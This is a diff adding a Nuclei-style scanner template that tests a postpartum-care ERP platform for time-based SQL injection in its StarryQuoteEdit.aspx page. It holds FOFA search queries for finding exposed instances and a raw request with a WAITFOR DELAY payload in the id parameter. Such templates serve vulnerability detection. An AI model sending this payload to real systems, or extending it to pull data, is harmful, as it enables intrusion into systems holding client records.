@@ -1,0 +1,29 @@
+id: StarryQuoteEdit-SQL
+
+info:
+  name: StarryQuoteEdit-SQL
+  author: lengmo
+  severity: high
+  description: StarryQuoteEdit-SQL
+  tags: sqli
+  metadata:
+    fofa-qeury: body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /Page/SalerManager/StarryQuoteEdit.aspx?id=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && duration>=5 && duration<=8 && contains(body,'月子会所')" 
